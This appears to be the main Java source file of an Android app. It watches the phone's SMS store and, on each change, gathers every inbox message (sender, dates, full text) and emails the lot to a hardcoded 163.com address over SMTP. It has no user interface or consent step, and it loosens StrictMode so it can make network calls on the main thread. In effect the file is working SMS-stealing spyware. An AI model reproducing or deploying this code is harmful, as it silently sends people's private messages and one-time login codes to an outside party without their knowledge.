package com.ddd.sun.sms2;

import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.StrictMode;
import android.os.SystemClock;
import android.support.annotation.IntegerRes;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Properties;

public class MainActivity extends AppCompatActivity {
    //private Button button;
    String allinfo = new String();
    String subject2 = new String();
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (android.os.Build.VERSION.SDK_INT > 9) {//强制在主线程中请求网络操作
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        //button = (Button) findViewById(R.id.buttonId);
        //View.OnClickListener listener = new MyButtonListener();
        //button.setOnClickListener(listener);

        SmsContent content = new SmsContent(new Handler());
        //注册短信变化监听
        this.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, content);

    }
    class SmsContent extends ContentObserver {
        private Cursor cursor = null;
        public SmsContent(Handler handler) {
            super(handler);
        }
        public String compareId = null;
        public String tempId = null;
        public String compareDate = null;
        public String tempDate = null;
        int i = 0;
        int j = 0;
        //int result = 2;
        int inttempId = 0;
        int intcompareId = 0;
        long inttempDate = 0;
        long intcompareDate = 0;

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            String info = new String();

            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//打印现在时间


            /*//读取收件箱中指定号码的短信
            cursor = managedQuery(Uri.parse("content://sms/inbox"), new String[]{"_id", "address", "read"}, " address=? and read=?", new String[]{"?", "0"}, "date desc");
            cursor = managedQuery(Uri.parse("content://sms/inbox"), new String[]{"_id", "address", "read"}, null,  new String[]{"?", "0"}, "date desc");
            if (cursor != null){
                System.out.println("unread sms: "+cursor.getCount());
                ContentValues values = new ContentValues();
                values.put("read", "1");		//修改短信为已读模式
                cursor.moveToFirst();
                while (cursor.isLast()){
                    //更新当前未读短信状态为已读
                    getContentResolver().update(Uri.parse("content://sms/inbox"), values, " _id=?", new String[]{""+cursor.getInt(0)});
                    cursor.moveToNext();
                }
            }else{
                System.out.println("no sms!");
            }*/

            Uri uri = Uri.parse("content://sms/inbox");
            //cursor = managedQuery(uri, new String[]{"_id","address","person","date","read","body"}, "read=?", new String[]{"0"}, "date desc");
            cursor = managedQuery(uri, new String[]{"_id","address","date","date_sent","read","body"}, null, null, "date desc");
            i=0;
            allinfo = "";
            if(cursor.moveToFirst()) {
                //id------------------
                tempId = cursor.getString(0);
                j++;
                System.out.println("tempId = " + tempId + " " + j);
                System.out.println("compareId = " + compareId + " " + j);
                if (compareId == null) {
                    intcompareId = 0;
                } else {
                    intcompareId = Integer.parseInt(compareId);
                }
                if (tempId == null) {
                    inttempId = 0;
                } else {
                    inttempId = Integer.parseInt(tempId);
                }
                System.out.println("inttempId = " + inttempId);
                System.out.println("intcompareId = " + intcompareId);
                if (inttempId == intcompareId) {
                    i++;
                    System.out.println(tempId + " - " + compareId + " i = " + i);
                } else {
                    compareId = tempId;
                }
                //date----------------
                tempDate = cursor.getString(2);
                System.out.println("tempDate = " + tempDate + " " + j);
                System.out.println("compareDate = " + compareDate + " " + j);
                if(compareDate == null){
                    intcompareDate = 0;
                }else{
                    intcompareDate = Long.parseLong(compareDate);
                }
                if(tempDate == null){
                    inttempDate = 0;
                }else{
                    inttempDate = Long.parseLong(tempDate);
                }
                System.out.println("inttempDate = " + inttempDate);
                System.out.println("intcompareDate = " + intcompareDate);
                if (inttempDate == intcompareDate) {
                    i++;
                    System.out.println(tempDate + " - " + compareDate + " i = " + i);
                } else {
                    compareDate = tempDate;
                }
            }


            System.out.println("i = "+i);
            if(cursor.moveToFirst()&&i<2&&intcompareId!=0){
                allinfo = allinfo.concat("|-Start------------------------------------------------------------------------------------------------------------\n");
                do{
                    for(int j = 0; j < cursor.getColumnCount(); j++){
                        if(j==2){
                            Long date = Long.parseLong(cursor.getString(j));
                            String date2 = dateFormat.format(date);
                            info = cursor.getColumnName(j) + "=" +date2;
                        }else if(j==3){
                            Long dates = Long.parseLong(cursor.getString(j));
                            String dates2 = dateFormat.format(dates);
                            info = cursor.getColumnName(j) + "=" +dates2;
                        }else if(j==5){
                            info = "\nHead---------------\n"+ cursor.getString(j)+"\n---------------Tail";
                        }else if(j==1){
                            info = cursor.getColumnName(j) + "=" + cursor.getString(j);
                            subject2 = cursor.getString(j);
                        }else{
                                info = cursor.getColumnName(j) + "=" + cursor.getString(j);
                        }
                        //info = info.replaceAll("\\n","\\\\n");
                        allinfo=allinfo.concat(info+" ");
                        //System.out.println("-+-"+allinfo);
                    }
                    //System.out.println("------what?-----");
                    allinfo = allinfo.concat("\n");
                }while(cursor.moveToNext());
                allinfo = allinfo.concat("|-End------------------------------------------------------------------------------------------------------------\n");
                System.out.println(allinfo);
                //sendsms!!!!!!!!!!!!!!!!!!!!!
                MailSenderInfo mailSenderInfo = new MailSenderInfo();
                SimpleMailSender sms = new SimpleMailSender();
                sms.sendTextMail(mailSenderInfo);
            }
        }
    }

    /*class MyButtonListener implements View.OnClickListener {
        @Override
        public void onClick(View v) {
            if (v.getId() == R.id.buttonId) {
                System.out.println("Pushed!");
                try{
                MailSenderInfo mailSenderInfo = new MailSenderInfo();
                SimpleMailSender sms = new SimpleMailSender();//按按钮发邮件
                sms.sendTextMail(mailSenderInfo);
            }
            catch (Exception e){
                Log.e("In SendMail...",e.getMessage(),e);
            }
            }
        }
    }*/


    public class MailSenderInfo{

        SimpleDateFormat now = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//打印现在时间
        String date = now.format(new Date());
        String mailServerHost = "smtp.163.com";
        String mailServerPort = "25";
        String fromAddress = "xxxxxx@163.com";
        String toAddress = "xxxxxx@163.com";
        String username = "xxxxxxx@163.com";
        String password = "xxxxxxxxx";
        boolean validate = true;
        //String subject = subject2+"日期"+date;
        String subject = subject2+" Time:"+date;
        String content = allinfo;

        public Properties getProperties()
        {
            //System.out.println(subject);
            Properties p = new Properties();
            p.put("mail.smtp.host", this.mailServerHost);
            p.put("mail.smtp.port", this.mailServerPort);
            p.put("mail.smtp.auth", this.validate ? "true" : "false");
            return p;
        }
    }
}




